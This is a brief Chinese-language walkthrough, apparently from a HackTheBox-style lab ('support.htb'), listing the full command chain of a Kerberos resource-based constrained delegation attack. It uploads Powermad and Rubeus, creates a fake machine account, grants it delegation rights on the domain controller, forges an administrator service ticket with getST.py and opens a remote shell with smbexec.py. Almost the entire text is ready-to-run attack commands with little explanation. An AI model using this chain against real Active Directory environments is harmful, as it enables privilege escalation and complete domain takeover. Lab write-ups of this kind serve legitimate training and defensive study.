# shared support account

采取基于 Kerberos 资源的约束委派攻击

```bash
1. 上传文件
upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe
Import-Module ./pm.ps1

2.设置参数
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DC"

3.添加一个新用户
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

4.给权限
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

5.检查是否工作
Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount

6. 生成hash，aes256
./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb

7. 以下kali执行-本机获取TGT票据
getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

8.添加票据
export KRB5CCNAME=administrator.ccache

9.票据登陆
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
```
